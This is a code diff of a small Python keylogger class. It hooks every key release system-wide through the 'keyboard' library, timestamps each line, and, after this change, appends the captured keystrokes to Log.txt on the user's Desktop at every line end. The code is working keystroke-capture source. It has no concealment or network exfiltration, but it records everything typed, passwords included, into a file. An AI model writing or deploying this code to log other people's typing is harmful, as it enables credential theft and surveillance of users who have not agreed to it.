@@ -1,12 +1,16 @@
 import keyboard
 from datetime import datetime, date
+import os
+
 
 
 class Logger:
 
     def __init__(self):
         self.log = ""
-        self.log_filename = "Log.txt"
+        self.log_filename = "\\Log.txt"
+        self.path = self.find_path()
+        self.activated = True
 
     def callback(self, event):
         """When a stroke happen this function is called"""
@@ -33,13 +37,14 @@ class Logger:
     def end_of_line(self):
             self.log += "\n"
             self.add_timestamp()
-
+            if self.activated:
+                self.write_log()
 
     def start(self):
         keyboard.on_release(callback=self.callback)
         keyboard.wait(hotkey='ctrl+shift+a')
-        print(self.log)
-        self.write_log()
+        if self.activated:
+            self.write_log()
 
     def add_timestamp(self):
         """Take the line and add time stamp"""
@@ -51,8 +56,19 @@ class Logger:
     def write_log(self):
         """Take the log and write it into a file"""
 
-        with open(self.log_filename, 'w') as a:
+        with open(self.path + self.log_filename, 'a') as a:
             a.write(self.log)
+
+    def find_path(self):
+
+        # Get the user's home directory
+        home_dir = os.path.expanduser("~")
+
+        # Construct the path to the desktop folder in Windows
+        desktop_path = os.path.join(home_dir, 'Desktop')
+
+        return desktop_path
+
 
 
 
